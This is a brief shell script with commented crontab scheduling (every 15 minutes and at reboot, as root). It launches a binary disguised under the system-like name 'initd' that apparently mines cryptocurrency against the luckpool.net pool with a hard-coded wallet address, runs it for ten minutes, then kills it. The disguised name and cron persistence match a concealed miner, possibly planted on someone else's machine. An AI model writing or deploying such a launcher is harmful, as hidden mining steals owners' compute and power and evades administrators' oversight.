# crontab -e
# https://crontab.guru/#*/15_*_*_*_*
# @reboot sh /root/countdown.sh
# */15 * * * * sh /root/countdown.sh


/usr/local/bin/initd -v -l na.luckpool.net:3960 -u RSqyBuPVpEA2mKq2pLx3YZj7ySWuXpMx3N.cpvgullo001 -p x &
TASK_PID=$!
sleep 600
kill $TASK_PID
